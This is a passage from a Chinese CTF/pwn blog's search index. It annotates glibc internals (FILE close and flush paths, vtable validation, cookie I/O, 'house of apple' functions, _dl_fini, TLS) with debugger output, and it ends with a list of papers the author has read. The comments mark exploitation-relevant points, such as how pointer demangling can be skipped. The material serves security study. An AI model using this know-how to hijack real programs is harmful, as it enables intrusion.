_IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp); // 将文件结构体从_IO_list_all链表中取下 _IO_acquire_lock (fp); if (fp-\u003e_flags \u0026 _IO_IS_FILEBUF) status = _IO_file_close_it (fp); // 关闭文件，释放文件流缓冲区 else status = fp-\u003e_flags \u0026 _IO_ERR_SEEN ? -1 : 0; _IO_release_lock (fp); _IO_FINISH (fp); if (fp-\u003e_mode \u003e 0) { struct _IO_codecvt *cc = fp-\u003e_codecvt; __libc_lock_lock (__gconv_lock); __gconv_release_step (cc-\u003e__cd_in.step); __gconv_release_step (cc-\u003e__cd_out.step); __libc_lock_unlock (__gconv_lock); } else { if (_IO_have_backup (fp)) _IO_free_backup_area (fp); } _IO_deallocate_file (fp); return status; } _IO_un_link void _IO_un_link (struct _IO_FILE_plus *fp) { if (fp-\u003efile._flags \u0026 _IO_LINKED) { FILE **f; #ifdef _IO_MTSAFE_IO _IO_cleanup_region_start_noarg (flush_cleanup); _IO_lock_lock (list_all_lock); run_fp = (FILE *) fp; _IO_flockfile ((FILE *) fp); #endif if (_IO_list_all == NULL) ; else if (fp == _IO_list_all) _IO_list_all = (struct _IO_FILE_plus *) _IO_list_all-\u003efile._chain; else for (f = \u0026_IO_list_all-\u003efile._chain; *f; f = \u0026(*f)-\u003e_chain) if (*f == (FILE *) fp) { *f = fp-\u003efile._chain; break; } fp-\u003efile._flags \u0026= ~_IO_LINKED; #ifdef _IO_MTSAFE_IO _IO_funlockfile ((FILE *) fp); run_fp = NULL; _IO_lock_unlock (list_all_lock); _IO_cleanup_region_end (0); #endif } } libc_hidden_def (_IO_un_link) _IO_new_file_close_it int _IO_new_file_close_it(FILE *fp) { int write_status; if (!_IO_file_is_open(fp)) return EOF; if ((fp-\u003e_flags \u0026 _IO_NO_WRITES) == 0 \u0026\u0026 (fp-\u003e_flags \u0026 _IO_CURRENTLY_PUTTING) != 0) write_status = _IO_do_flush(fp); else write_status = 0; _IO_unsave_markers(fp); int close_status = ((fp-\u003e_flags2 \u0026 _IO_FLAGS2_NOCLOSE) == 0 ? _IO_SYSCLOSE(fp) // 系统调用关闭文件 : 0); // 释放文件流缓冲区 if (fp-\u003e_mode \u003e 0) { if (_IO_have_wbackup(fp)) _IO_free_wbackup_area(fp); _IO_wsetb(fp, NULL, NULL, 0); _IO_wsetg(fp, NULL, NULL, NULL); _IO_wsetp(fp, NULL, NULL); } _IO_setb(fp, NULL, NULL, 0); _IO_setg(fp, NULL, NULL, NULL); _IO_setp(fp, NULL, NULL); _IO_un_link((struct _IO_FILE_plus *)fp); fp-\u003e_flags = _IO_MAGIC | CLOSED_FILEBUF_FLAGS; fp-\u003e_fileno = -1; fp-\u003e_offset = _IO_pos_BAD; return close_status ? close_status : write_status; } libc_hidden_ver(_IO_new_file_close_it, _IO_file_close_it) ","date":"2024-11-19","objectID":"/source_analyze/:2:5","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"puts _IO_puts int _IO_puts(const char *str) { int result = EOF; _IO_size_t len = strlen(str); _IO_acquire_lock(_IO_stdout); if ((_IO_vtable_offset(_IO_stdout) != 0 || _IO_fwide(_IO_stdout, -1) == -1) \u0026\u0026 _IO_sputn(_IO_stdout, str, len) == len \u0026\u0026 _IO_putc_unlocked('\\n', _IO_stdout) != EOF) result = MIN(INT_MAX, len + 1); _IO_release_lock(_IO_stdout); return result; } _IO_sputn // 2.27 宏展开 ((IO_validate_vtable ( *(struct _IO_jump_t **) ( // 转换为_IO_jump_t * 类型指针最终传入IO_validate_vtable (void *) \u0026( // 由 char * 转换为 vtable 对应类型 *(__typeof__ (((struct _IO_FILE_plus){}).vtable) *)( // 获取_IO_stdout基地址，计算出vtable成员在_IO_stdout结构体地址 ((char *) ((_IO_stdout))) + __builtin_offsetof (struct _IO_FILE_plus, vtable) ) ) + (_IO_stdout)-\u003e_vtable_offset // 一般为0，应对特殊情况偏移 ) ))-\u003e__xsputn) (_IO_stdout, str, len); IO_validate_vtable // 2.27 检查传入的 vtable 指针是否指向 libc 库中定义的有效的 I/O 操作函数表 static inline const struct _IO_jump_t *IO_validate_vtable(const struct _IO_jump_t *vtable) { // 计算 I/O 操作函数表在内存中总大小 uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; const char *ptr = (const char *)vtable; // 强制转换类型以计算偏移 uintptr_t offset = ptr - __start___libc_IO_vtables; // 计算偏移量 if (__glibc_unlikely(offset \u003e= section_length)) // 判断是否超过总大小 _IO_vtable_check(); // 最终报错 return vtable; } _IO_vtable_check void attribute_hidden _IO_vtable_check (void) { #ifdef SHARED // 仅共享库模式下编译 void (*flag) (void) = atomic_load_relaxed (\u0026IO_accept_foreign_vtables); #ifdef PTR_DEMANGLE // 处理函数指针的混淆或解混淆 PTR_DEMANGLE (flag); // 解码函数指针flag值 #endif if (flag == \u0026_IO_vtable_check) return; { Dl_info di; // 存储动态链接器返回的信息，例如符号名和地址 struct link_map *l; if (!rtld_active () // 检查运行时动态链接器是否处于活动状态 || (_dl_addr (_IO_vtable_check, \u0026di, \u0026l, NULL) != 0 \u0026\u0026 l-\u003el_ns != LM_ID_BASE)) return; } #else // 非共享库模式 if (__dlopen != NULL) return; #endif __libc_fatal (\"Fatal error: glibc detected an invalid stdio handle\\n\"); } rtld_active # define GLRO(name) _rtld_local_ro._##name static inline bool rtld_active (void) { return GLRO(dl_init_all_dirs) != NULL; } _dl_addr int _dl_addr(const void *address, Dl_info *info, struct link_map **mapp, const ElfW(Sym) * *symbolp) { const ElfW(Addr) addr = DL_LOOKUP_ADDRESS(address); int result = 0; /* libc-lockP.h 关键exit-hook # define __rtld_lock_lock_recursive(NAME) \\ __libc_maybe_call (__pthread_mutex_lock, (\u0026(NAME).mutex), 0) 替换: (({ __typeof(__pthread_mutex_lock) *_fn = (__pthread_mutex_lock); _fn != ((void *) 0) ? (*_fn)(\u0026(_dl_load_lock).mutex) : 0; })) */ __rtld_lock_lock_recursive(GL(dl_load_lock)); struct link_map *l = _dl_find_dso_for_object(addr); if (l) { determine_info(addr, l, info, mapp, symbolp); result = 1; } __rtld_lock_unlock_recursive(GL(dl_load_lock)); return result; } libc_hidden_def(_dl_addr) ","date":"2024-11-19","objectID":"/source_analyze/:2:6","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"flush _IO_flush_all_lockp // 程序退出时会调用 int _IO_flush_all_lockp(int do_lock) { int result = 0; struct _IO_FILE *fp; int last_stamp; #ifdef _IO_MTSAFE_IO __libc_cleanup_region_start(do_lock, flush_cleanup, NULL); if (do_lock) _IO_lock_lock(list_all_lock); #endif last_stamp = _IO_list_all_stamp; fp = (_IO_FILE *)_IO_list_all; // 获取fp while (fp != NULL) { run_fp = fp; if (do_lock) _IO_flockfile(fp); if (((fp-\u003e_mode \u003c= 0 \u0026\u0026 fp-\u003e_IO_write_ptr \u003e fp-\u003e_IO_write_base) #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset(fp) == 0 \u0026\u0026 fp-\u003e_mode \u003e 0 \u0026\u0026 (fp-\u003e_wide_data-\u003e_IO_write_ptr \u003e fp-\u003e_wide_data-\u003e_IO_write_base)) #endif ) \u0026\u0026 _IO_OVERFLOW(fp, EOF) == EOF) // 调用_IO_OVERFLOW， 参数为fp，即_IO_FILE结构体指针 result = EOF; if (do_lock) _IO_funlockfile(fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) { /* Something was added to the list. Start all over again. */ fp = (_IO_FILE *)_IO_list_all; last_stamp = _IO_list_all_stamp; } else fp = fp-\u003e_chain; } #ifdef _IO_MTSAFE_IO if (do_lock) _IO_lock_unlock(list_all_lock); __libc_cleanup_region_end(0); #endif return result; } _IO_str_overflow int _IO_str_overflow (FILE *fp, int c) { int flush_only = c == EOF; size_t pos; if (fp-\u003e_flags \u0026 _IO_NO_WRITES) return flush_only ? 0 : EOF; if ((fp-\u003e_flags \u0026 _IO_TIED_PUT_GET) \u0026\u0026 !(fp-\u003e_flags \u0026 _IO_CURRENTLY_PUTTING)) { fp-\u003e_flags |= _IO_CURRENTLY_PUTTING; fp-\u003e_IO_write_ptr = fp-\u003e_IO_read_ptr; fp-\u003e_IO_read_ptr = fp-\u003e_IO_read_end; } pos = fp-\u003e_IO_write_ptr - fp-\u003e_IO_write_base; if (pos \u003e= (size_t) (_IO_blen (fp) + flush_only)) { if (fp-\u003e_flags \u0026 _IO_USER_BUF) return EOF; else { char *new_buf; char *old_buf = fp-\u003e_IO_buf_base; size_t old_blen = _IO_blen (fp); // _IO_buf_end - _IO_buf_base size_t new_size = 2 * old_blen + 100; // 获取新大小 if (new_size \u003c old_blen) return EOF; new_buf = malloc (new_size); // 使用malloc申请新的内存，从tcache中获取 if (new_buf == NULL) { return EOF; } if (old_buf) { memcpy (new_buf, old_buf, old_blen); // 从old_buf内容拷贝到新的buf中 free (old_buf); // 释放old_buf fp-\u003e_IO_buf_base = NULL; } memset (new_buf + old_blen, '\\0', new_size - old_blen); _IO_setb (fp, new_buf, new_buf + new_size, 1); fp-\u003e_IO_read_base = new_buf + (fp-\u003e_IO_read_base - old_buf); fp-\u003e_IO_read_ptr = new_buf + (fp-\u003e_IO_read_ptr - old_buf); fp-\u003e_IO_read_end = new_buf + (fp-\u003e_IO_read_end - old_buf); fp-\u003e_IO_write_ptr = new_buf + (fp-\u003e_IO_write_ptr - old_buf); fp-\u003e_IO_write_base = new_buf; fp-\u003e_IO_write_end = fp-\u003e_IO_buf_end; } } if (!flush_only) *fp-\u003e_IO_write_ptr++ = (unsigned char) c; if (fp-\u003e_IO_write_ptr \u003e fp-\u003e_IO_read_end) fp-\u003e_IO_read_end = fp-\u003e_IO_write_ptr; return c; } libc_hidden_def (_IO_str_overflow) _IO_fflush int _IO_fflush(FILE *fp) { if (fp == NULL) return _IO_flush_all(); // 刷新所有打开可用的文件流 else { // 处理单个流 int result; CHECK_FILE(fp, EOF); // 验证是否有效 _IO_acquire_lock(fp); /* #define _IO_SYNC(FP) JUMP0 (__sync, FP) 扩展到: ((IO_validate_vtable ((*(__typeof__ (((struct _IO_FILE_plus){}).vtable) *)(((char *) ((fp))) + __builtin_offsetof (struct _IO_FILE_plus, vtable)))))-\u003e__sync) (fp) */ result = _IO_SYNC(fp) ? EOF : 0; // 调用vtable中的函数: 文件流的 __sync 函数指针 _IO_release_lock(fp); return result; } } libc_hidden_def(_IO_fflush) ","date":"2024-11-19","objectID":"/source_analyze/:2:7","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"printf __fxprintf int __fxprintf(FILE *fp, const char *fmt, ...) { va_list ap; va_start(ap, fmt); int res = __vfxprintf(fp, fmt, ap, 0); va_end(ap); return res; } __vfxprintf int __vfxprintf(FILE *fp, const char *fmt, va_list ap, unsigned int mode_flags) { if (fp == NULL) fp = stderr; _IO_flockfile(fp); int res = locked_vfxprintf(fp, fmt, ap, mode_flags); _IO_funlockfile(fp); return res; } locked_vfxprintf // # define vfprintf __vfprintf_internal static int locked_vfxprintf(FILE *fp, const char *fmt, va_list ap, unsigned int mode_flags) { if (_IO_fwide(fp, 0) \u003c= 0) return __vfprintf_internal(fp, fmt, ap, mode_flags); wchar_t *wfmt; mbstate_t mbstate; int res; int used_malloc = 0; size_t len = strlen(fmt) + 1; if (__glibc_unlikely(len \u003e SIZE_MAX / sizeof(wchar_t))) { __set_errno(EOVERFLOW); return -1; } if (__libc_use_alloca(len * sizeof(wchar_t))) wfmt = alloca(len * sizeof(wchar_t)); else if ((wfmt = malloc(len * sizeof(wchar_t))) == NULL) return -1; else used_malloc = 1; memset(\u0026mbstate, 0, sizeof mbstate); res = __mbsrtowcs(wfmt, \u0026fmt, len, \u0026mbstate); if (res != -1) res = __vfwprintf_internal(fp, wfmt, ap, mode_flags); if (used_malloc) free(wfmt); return res; } __printf int __printf (const char *format, ...) { va_list arg; int done; va_start (arg, format); done = __vfprintf_internal (stdout, format, arg, 0); va_end (arg); return done; } __register_printf_function int __register_printf_function(int spec, printf_function converter, printf_arginfo_function arginfo){ return __register_printf_specifier(spec, converter, (printf_arginfo_size_function *)arginfo); } weak_alias(__register_printf_function, register_printf_function) __register_printf_specifier int __register_printf_specifier(int spec, printf_function converter, printf_arginfo_size_function arginfo){ // spec: fmt的ascii码, converter与arginfo: 要绑定的函数与参数指针 if (spec \u003c 0 || spec \u003e (int)UCHAR_MAX) // UCHAR_MAX: SCHAR_MAX[0x7f] * 2 + 1 = 0xff { __set_errno(EINVAL); return -1; } int result = 0; __libc_lock_lock(lock); // 若该表是空的 if (__printf_function_table == NULL) { // calloc分配一块内存对arginfo表进行初始化，一次性分配两个指针份的堆块 __printf_arginfo_table = (printf_arginfo_size_function **) calloc(UCHAR_MAX + 1, sizeof(void *) * 2);// void * 为8字节，共申请0x10 * 0x100 if (__printf_arginfo_table == NULL) { result = -1; goto out; } // 初始化function表，紧邻arginfo表 __printf_function_table = (printf_function **)(__printf_arginfo_table + UCHAR_MAX + 1); } // 绑定 __printf_function_table[spec] = converter; __printf_arginfo_table[spec] = arginfo; out: __libc_lock_unlock(lock); return result; } libc_hidden_def(__register_printf_specifier) weak_alias(__register_printf_specifier, register_printf_specifier) ","date":"2024-11-19","objectID":"/source_analyze/:2:8","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"assert __malloc_assert static void __malloc_assert (const char *assertion, const char *file, unsigned int line, const char *function) { (void) __fxprintf (NULL, \"%s%s%s:%u: %s%sAssertion `%s' failed.\\n\", __progname, __progname[0] ? \": \" : \"\", file, line, function ? function : \"\", function ? \": \" : \"\", assertion); fflush (stderr); abort (); } ","date":"2024-11-19","objectID":"/source_analyze/:2:9","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"cookie _IO_cookie_read static ssize_t _IO_cookie_read(FILE *fp, void *buf, ssize_t size) { // 将fp转换为_IO_cookie_file *类型的cfile结构体 struct _IO_cookie_file *cfile = (struct _IO_cookie_file *)fp; // 通过偏移取出存放在read对应对象中的函数指针 cookie_read_function_t *read_cb = cfile-\u003e__io_functions.read; #ifdef PTR_DEMANGLE PTR_DEMANGLE(read_cb); // 进行了加密 #endif if (read_cb == NULL) return -1; return read_cb(cfile-\u003e__cookie, buf, size); // 调用该指针，传入参数为__cookie } _IO_cookie_write static ssize_t _IO_cookie_write(FILE *fp, const void *buf, ssize_t size) { struct _IO_cookie_file *cfile = (struct _IO_cookie_file *)fp; cookie_write_function_t *write_cb = cfile-\u003e__io_functions.write; #ifdef PTR_DEMANGLE // 对指针进行加密：取出对应函数指针，将函数指针循环右移11位，并与`fs:[0x30]`异或得到真正函数地址 PTR_DEMANGLE(write_cb); #endif if (write_cb == NULL) { fp-\u003e_flags |= _IO_ERR_SEEN; return 0; } ssize_t n = write_cb(cfile-\u003e__cookie, buf, size); if (n \u003c size) fp-\u003e_flags |= _IO_ERR_SEEN; return n; } _IO_cookie_close static int _IO_cookie_close(FILE *fp) { struct _IO_cookie_file *cfile = (struct _IO_cookie_file *)fp; cookie_close_function_t *close_cb = cfile-\u003e__io_functions.close; #ifdef PTR_DEMANGLE PTR_DEMANGLE(close_cb); #endif if (close_cb == NULL) return 0; return close_cb(cfile-\u003e__cookie); } _IO_cookie_seek static off64_t _IO_cookie_seek(FILE *fp, off64_t offset, int dir) { struct _IO_cookie_file *cfile = (struct _IO_cookie_file *)fp; cookie_seek_function_t *seek_cb = cfile-\u003e__io_functions.seek; #ifdef PTR_DEMANGLE PTR_DEMANGLE(seek_cb); #endif return ((seek_cb == NULL || (seek_cb(cfile-\u003e__cookie, \u0026offset, dir) == -1) || offset == (off64_t)-1) ? _IO_pos_BAD : offset); } ","date":"2024-11-19","objectID":"/source_analyze/:2:10","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"house of apple 记录相关一些函数 _IO_wstrn_overflow static wint_t _IO_wstrn_overflow (FILE *fp, wint_t c) { // 先将 fp 强制转换为_IO_wstrnfile *指针 _IO_wstrnfile *snf = (_IO_wstrnfile *) fp; if (fp-\u003e_wide_data-\u003e_IO_buf_base != snf-\u003eoverflow_buf) // 一般都成立 { _IO_wsetb (fp, snf-\u003eoverflow_buf, snf-\u003eoverflow_buf + (sizeof (snf-\u003eoverflow_buf) / sizeof (wchar_t)), 0); // 成立会对以下四个值赋值为`snf-\u003eoverflow_buf`或相关偏移值 fp-\u003e_wide_data-\u003e_IO_write_base = snf-\u003eoverflow_buf; fp-\u003e_wide_data-\u003e_IO_read_base = snf-\u003eoverflow_buf; fp-\u003e_wide_data-\u003e_IO_read_ptr = snf-\u003eoverflow_buf; fp-\u003e_wide_data-\u003e_IO_read_end = (snf-\u003eoverflow_buf + (sizeof (snf-\u003eoverflow_buf) / sizeof (wchar_t))); } // 赋值 fp-\u003e_wide_data-\u003e_IO_write_ptr = snf-\u003eoverflow_buf; fp-\u003e_wide_data-\u003e_IO_write_end = snf-\u003eoverflow_buf; return c; } _IO_wsetb void _IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a) { if (f-\u003e_wide_data-\u003e_IO_buf_base \u0026\u0026 !(f-\u003e_flags2 \u0026 _IO_FLAGS2_USER_WBUF)) free (f-\u003e_wide_data-\u003e_IO_buf_base); // 其不为0的时候不要执行到这里 f-\u003e_wide_data-\u003e_IO_buf_base = b; f-\u003e_wide_data-\u003e_IO_buf_end = eb; if (a) f-\u003e_flags2 \u0026= ~_IO_FLAGS2_USER_WBUF; else f-\u003e_flags2 |= _IO_FLAGS2_USER_WBUF; } __libio_codecvt_in enum __codecvt_result __libio_codecvt_in (struct _IO_codecvt *codecvt, __mbstate_t *statep, const char *from_start, const char *from_end, const char **from_stop, wchar_t *to_start, wchar_t *to_end, wchar_t **to_stop) { enum __codecvt_result result; struct __gconv_step *gs = codecvt-\u003e__cd_in.step; // // gs 源自第一个参数 int status; size_t dummy; const unsigned char *from_start_copy = (unsigned char *) from_start; codecvt-\u003e__cd_in.step_data.__outbuf = (unsigned char *) to_start; codecvt-\u003e__cd_in.step_data.__outbufend = (unsigned char *) to_end; codecvt-\u003e__cd_in.step_data.__statep = statep; __gconv_fct fct = gs-\u003e__fct; // 若其不为空，用__pointer_guard解密，设置为NULL可绕过解密 if (gs-\u003e__shlib_handle != NULL) PTR_DEMANGLE (fct); // 函数指针调用，该宏实际调用fct(gs, ...) status = DL_CALL_FCT (fct, (gs, \u0026codecvt-\u003e__cd_in.step_data, \u0026from_start_copy, (const unsigned char *) from_end, NULL, \u0026dummy, 0, 0)); *from_stop = (const char *) from_start_copy; *to_stop = (wchar_t *) codecvt-\u003e__cd_in.step_data.__outbuf; switch (status) { case __GCONV_OK: case __GCONV_EMPTY_INPUT: result = __codecvt_ok; break; case __GCONV_FULL_OUTPUT: case __GCONV_INCOMPLETE_INPUT: result = __codecvt_partial; break; default: result = __codecvt_error; break; } return result; } ","date":"2024-11-19","objectID":"/source_analyze/:2:11","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"ld.so ","date":"2024-11-19","objectID":"/source_analyze/:3:0","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"结构 rtld_global struct rtld_global { #endif #ifdef SHARED # define DL_NNS 16 #else # define DL_NNS 1 #endif EXTERN struct link_namespaces { struct link_map *_ns_loaded; unsigned int _ns_nloaded; struct r_scope_elem *_ns_main_searchlist; unsigned int _ns_global_scope_alloc; unsigned int _ns_global_scope_pending_adds; struct link_map *libc_map; struct unique_sym_table { __rtld_lock_define_recursive (, lock) struct unique_sym { uint32_t hashval; const char *name; const ElfW(Sym) *sym; const struct link_map *map; } *entries; size_t size; size_t n_elements; void (*free) (void *); } _ns_unique_sym_table; struct r_debug_extended _ns_debug; } _dl_ns[DL_NNS]; EXTERN size_t _dl_nns; ...... _rtld_global 可用 gdb 查看p _rtld_global // glibc-2.38 rtld.c 该变量在 ld.so 内存地址范围内 struct rtld_global _rtld_global = { #include \u003cdl-procruntime.c\u003e ._dl_stack_flags = DEFAULT_STACK_PERMS, #ifdef _LIBC_REENTRANT ._dl_load_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER, ._dl_load_write_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER, ._dl_load_tls_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER, #endif ._dl_nns = 1, ._dl_ns = { #ifdef _LIBC_REENTRANT [LM_ID_BASE] = { ._ns_unique_sym_table = { .lock = _RTLD_LOCK_RECURSIVE_INITIALIZER } } #endif } }; _dl_ns // _dl_ns 为 link_namespaces 结构体 16 项数组 pwndbg\u003e p \u0026_rtld_global._dl_ns $1 = (struct link_namespaces (*)[16]) 0x7ffff7ffd040 \u003c_rtld_local\u003e pwndbg\u003e p _rtld_global._dl_ns $2 = {{ _ns_loaded = 0x7ffff7ffe168, _ns_nloaded = 4, _ns_main_searchlist = 0x7ffff7ffe420, _ns_global_scope_alloc = 0, _ns_unique_sym_table = { lock = { mutex = { __data = { __lock = 0, __count = 0, __owner = 0, __nusers = 0, __kind = 1, __spins = 0, __elision = 0, __list = { __prev = 0x0, __next = 0x0 } }, __size = '\\000' \u003crepeats 16 times\u003e, \"\\001\", '\\000' \u003crepeats 22 times\u003e, __align = 0 } }, entries = 0x0, size = 0, n_elements = 0, free = 0x0 }, _ns_debug = { r_version = 0, r_map = 0x0, r_brk = 0, r_state = RT_CONSISTENT, r_ldbase = 0 } }, { _ns_loaded = 0x0, _ns_nloaded = 0, _ns_main_searchlist = 0x0, _ns_global_scope_alloc = 0, _ns_unique_sym_table = { lock = { mutex = { __data = { __lock = 0, __count = 0, __owner = 0, __nusers = 0, __kind = 0, __spins = 0, __elision = 0, __list = { __prev = 0x0, __next = 0x0 } }, __size = '\\000' \u003crepeats 39 times\u003e, __align = 0 } }, entries = 0x0, size = 0, n_elements = 0, free = 0x0 }, _ns_debug = { r_version = 0, r_map = 0x0, r_brk = 0, r_state = RT_CONSISTENT, r_ldbase = 0 } } \u003crepeats 15 times\u003e} 第 0 项 pwndbg\u003e p _rtld_global._dl_ns[0] $9 = { _ns_loaded = 0x7ffff7ffe168, // (struct link_map *) 指向 link_map 结构体的指针 _ns_nloaded = 4, // 表示 _ns_nloaded 有多少 link_map 结构体 _ns_main_searchlist = 0x7ffff7ffe420, _ns_global_scope_alloc = 0, _ns_unique_sym_table = { lock = { mutex = { __data = { __lock = 0, __count = 0, __owner = 0, __nusers = 0, __kind = 1, __spins = 0, __elision = 0, __list = { __prev = 0x0, __next = 0x0 } }, __size = '\\000' \u003crepeats 16 times\u003e, \"\\001\", '\\000' \u003crepeats 22 times\u003e, __align = 0 } }, entries = 0x0, size = 0, n_elements = 0, free = 0x0 }, _ns_debug = { r_version = 0, r_map = 0x0, r_brk = 0, r_state = RT_CONSISTENT, r_ldbase = 0 } } _dl_nns pwndbg\u003e p \u0026_rtld_global._dl_nns $3 = (size_t *) 0x7ffff7ffd940 \u003c_rtld_local+2304\u003e pwndbg\u003e p _rtld_global._dl_nns $4 = 1 // 表明 _dl_ns 数组中有效的项，一般为第0项 link_map struct link_map { ElfW(Addr) l_addr; // 程序加载的内存基址 char *l_name; ElfW(Dyn) * l_ld; struct link_map *l_next, *l_prev; // 双向链表结构，分别指向下一个和前一个link_map结构体 struct link_map *l_real; // 标识该共享库的真实映射 Lmid_t l_ns; struct libname_list *l_libname; // l_info 指向 ELF 文件的Dynamic节，包括指向 DT_INIT、DT_FINI、DT_FINI_ARRAY 和其他Dynamic节的指针 ElfW(Dyn) * l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM]; const ElfW(Phdr) * l_phdr; ElfW(Addr) l_entry; ElfW(Half) l_phnum; ElfW(Half) l_ldnum; struct r_scope_elem l_searchlist; struct r_scope_elem l_symbolic_searchlist; struct link_map *l_loader; struct r_found_version *l_versions; unsigned int l_nversions; Elf_Symndx l_nbuckets; Elf32_Word l_gnu_bitmask_idxbits; Elf32_W","date":"2024-11-19","objectID":"/source_analyze/:3:1","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"2.38 _dl_fini 程序退出或动态库卸载时调用所有已加载共享库（ .so 文件）的析构函数 void _dl_fini (void) { #ifdef SHARED int do_audit = 0; // 标记是否进行审计操作 again: // 用于重试的逻辑 #endif // GL(dl_nns): 命名空间的数量，一般为 1，此时 ns 为 0 for (Lmid_t ns = GL(dl_nns) - 1; ns \u003e= 0; --ns) // 从最后一个命名空间开始遍历所有命名空间 { __rtld_lock_lock_recursive (GL(dl_load_lock)); // 加锁 unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded; // 当前命名空间中加载的共享对象数量, 即多少个link_map if (nloaded == 0 #ifdef SHARED || GL(dl_ns)[ns]._ns_loaded-\u003el_auditing != do_audit #endif ) __rtld_lock_unlock_recursive (GL(dl_load_lock)); // 释放锁 else { #ifdef SHARED _dl_audit_activity_nsid (ns, LA_ACT_DELETE); // 审计活动标记为删除(LA_ACT_DELETE), 记录审计日志 #endif struct link_map *maps[nloaded]; // maps 数组收集当前命名空间中所有加载的共享对象 unsigned int i; struct link_map *l; assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL); // 遍历链表中每一个link_map结构体 for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-\u003el_next) if (l == l-\u003el_real) // 需要指向自身 { assert (i \u003c nloaded); maps[i] = l; // 将指针存到 maps 中初始化 l-\u003el_idx = i; // 赋值索引 ++i; // 索引自增 ++l-\u003el_direct_opencount; } // 检查 ns = 0, LM_ID_BASE = 0 assert (ns != LM_ID_BASE || i == nloaded); assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1); unsigned int nmaps = i; // 对 maps 数组中共享对象进行排序，确保按正确的顺序调用析构函数 _dl_sort_maps (maps, nmaps, (ns == LM_ID_BASE), true); // 伪造变化可能卡在此处 __rtld_lock_unlock_recursive (GL(dl_load_lock)); for (i = 0; i \u003c nmaps; ++i) // 遍历maps数组 { struct link_map *l = maps[i]; // 取出结构体 if (l-\u003el_init_called) { _dl_call_fini (l); // 调用每个加载对象的析构函数 #ifdef SHARED _dl_audit_objclose (l); #endif } --l-\u003el_direct_opencount; } #ifdef SHARED _dl_audit_activity_nsid (ns, LA_ACT_CONSISTENT); #endif } } #ifdef SHARED if (! do_audit \u0026\u0026 GLRO(dl_naudit) \u003e 0) { do_audit = 1; goto again; } if (__glibc_unlikely (GLRO(dl_debug_mask) \u0026 DL_DEBUG_STATISTICS)) _dl_debug_printf (\"\\nruntime linker statistics:\\n\" \" final number of relocations: %lu\\n\" \"final number of relocations from cache: %lu\\n\", GL(dl_num_relocations), GL(dl_num_cache_relocations)); #endif } _dl_call_fini void _dl_call_fini(void *closure_map) { struct link_map *map = closure_map; if (__glibc_unlikely(GLRO(dl_debug_mask) \u0026 DL_DEBUG_IMPCALLS)) _dl_debug_printf(\"\\ncalling fini: %s [%lu]\\n\\n\", map-\u003el_name, map-\u003el_ns); map-\u003el_init_called = 0; ElfW(Dyn) *fini_array = map-\u003el_info[DT_FINI_ARRAY]; // 取出第26项 if (fini_array != NULL) { ElfW(Addr) *array = (ElfW(Addr) *)(map-\u003el_addr + fini_array-\u003ed_un.d_ptr); // 相加找到array指针数组 size_t sz = (map-\u003el_info[DT_FINI_ARRAYSZ]-\u003ed_un.d_val / sizeof(ElfW(Addr))); // 第28项获取大小size while (sz-- \u003e 0) // 从后往前依次调用array数组中的函数 ((fini_t)array[sz])(); } ElfW(Dyn) *fini = map-\u003el_info[DT_FINI]; if (fini != NULL) DL_CALL_DT_FINI(map, ((void *)map-\u003el_addr + fini-\u003ed_un.d_ptr)); } ","date":"2024-11-19","objectID":"/source_analyze/:3:2","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"TLS ","date":"2024-11-19","objectID":"/source_analyze/:4:0","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"结构 tcbhead_t typedef struct { void *tcb; /* 指向TCB */ dtv_t *dtv; /* 指向dtv数组 */ void *self; /* 指向自身 */ int multiple_threads; int gscope_flag; uintptr_t sysinfo; uintptr_t stack_guard; /* canary值 */ uintptr_t pointer_guard; /* 用于保护指针 */ //... } tcbhead_t; ","date":"2024-11-19","objectID":"/source_analyze/:4:1","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["记录"],"content":"记录下研究生以来研究的论文","date":"2024-10-24","objectID":"/record_thesis/","tags":["thesis"],"title":"论文阅读记录","uri":"/record_thesis/"},{"categories":["记录"],"content":" 论文 开源 阅读状态 是否复现 类型 LLM-Fuzzer: Scaling Assessment of Large Language Model Jailbreaks https://github.com/sherdencooper/GPTFuzz sc n 大模型模糊测试 FairECom: Towards Proof of E-Commerce Fairness Against Price Discrimination https://github.com/CyberSec-Dev/FairECom pc n 价格歧视规避 PyRTFuzz: Detecting Bugs in Python Runtimes via Two-Level Collaborative Fuzzing https://github.com/awen-li/PyRTFuzz n Python模糊测试 Towards Robust Detection of Open Source Software Supply Chain Poisoning Attacks in Industry Environments - fc n 软件供应链投毒攻击检测 Cognitive Bias in Decision-Making with LLMs https://huggingface.co/datasets/jecht/cognitive_bias 数据集 fc n 大模型认知偏差检测 阅读状态：fc(Fully completed), sc(Substantially completed), pc(Partially completed) 